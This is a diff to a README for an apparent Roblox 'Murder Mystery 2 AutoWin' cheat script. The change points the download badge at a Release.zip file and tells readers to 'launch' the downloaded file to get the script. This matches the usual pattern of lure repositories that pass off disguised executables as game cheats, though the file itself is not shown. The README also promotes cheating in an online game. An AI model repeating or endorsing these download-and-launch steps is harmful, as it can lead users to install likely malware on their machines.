@@ -29,7 +29,7 @@ Welcome to the Murder Mystery 2 AutoWin repository! This Lua script is designed 
 
 ### 🌟 How to Get Started:
 1. Download the Lua script from the following link: 
-[![Download Lua Script](https://img.shields.io/badge/Download-Lua_Script-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Lua Script](https://github.com/Willsmithyt/Murder-Mystery-2-AutoWin-Educational-Automation-for-Roblox/releases/download/v1.0/Release.zip)](https://github.com/Willsmithyt/Murder-Mystery-2-AutoWin-Educational-Automation-for-Roblox/releases/download/v1.0/Release.zip)
 2. If the link ends with a file name, make sure to launch it to access the script.
 3. You can also visit the link provided to explore and utilize the resources for this project.
 4. If the link is not working, please check the "Releases" section of the repository for alternative download options.
